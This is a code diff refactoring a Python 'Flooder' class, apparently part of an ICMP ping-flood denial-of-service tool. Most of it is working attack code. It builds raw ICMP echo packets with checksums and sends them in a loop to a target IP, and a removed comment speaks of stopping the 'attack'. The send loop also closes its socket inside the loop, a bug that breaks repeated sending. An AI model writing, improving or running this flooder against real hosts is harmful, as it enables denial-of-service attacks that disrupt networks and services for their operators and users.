@@ -1,51 +1,42 @@
-import time
-import struct
-import socket
-from threading import Thread, Event
+from struct import pack
+from time import time, sleep
+
+from socket import (
+    socket,
+    htons,
+    inet_aton,
+    AF_INET,
+    SOCK_RAW,
+    IPPROTO_ICMP
+)
 
 
 class Flooder(object):
     def __init__(self, ip, port, length, freq, threads):
+        self.running_status = True
         self.create_socket(ip, port, length, freq)
-        # event = Event()
-        # list_threads = []
-        # try:
-        #     for i in range(threads):
-        #         thread = Thread(target=self.create_socket(ip, port, length, freq))
-        #         thread.daemon = True
-        #         thread.start()
-        #         list_threads.append(thread)
-        # except KeyboardInterrupt:
-        #     event.set()
-        #     print('\t Stop open threads ...\n')
-        #     for thread in list_threads:
-        #         thread.join()
-        #     print('\t Attack has been stopped!!!\n')
 
     @staticmethod
-    def checksum(msg):
-        sum = 0
-        for i in range(0, len(msg), 2):
-            w = msg[i] + (msg[i + 1] << 8)
-            sum = ((sum + w) & 0xffff) + ((sum + w) >> 16)
-        return socket.htons(~sum & 0xffff)
+    def _checksum(message) -> int:
+        summary = 0
+        for i in range(0, len(message), 2):
+            w = message[i] + (message[i + 1] << 8)
+            summary = ((summary + w) & 0xffff) + ((summary + w) >> 16)
+        return htons(~summary & 0xffff)
 
-    # Construct the header and data of packet and pack it
-    def construct_packet(self, length):
-        header = struct.pack("bbHHh", 8, 0, 0, 1, 1)
+    def _construct_packet(self, length: int):
+        header = pack("bbHHh", 8, 0, 0, 1, 1)
         data = (length - 50) * 'Q'
-        data = struct.pack("d", time.time()) + data.encode('ascii')
-        header = struct.pack("bbHHh", 8, 0, socket.htons(self.checksum(header + data)), 1, 1)
+        data = pack("d", time()) + data.encode('ascii')
+        header = pack("bbHHh", 8, 0, htons(self._checksum(header + data)), 1, 1)
         return header + data
 
-    # Create socket to send packets to specified ip address
-    #  and close the created socket after using
-    def create_socket(self, ip, port, length, freq):
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-        socket.inet_aton(ip)
+    def create_socket(self, ip: str, port: int, length: int, freq: float) -> None:
+        sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
+        inet_aton(ip)
 
-        while True:
-            packet = self.construct_packet(length)
+        while self.running_status:
+            packet = self._construct_packet(length)
             sock.sendto(packet, (ip, port))
-            time.sleep(freq)
+            sleep(freq)
             sock.close()
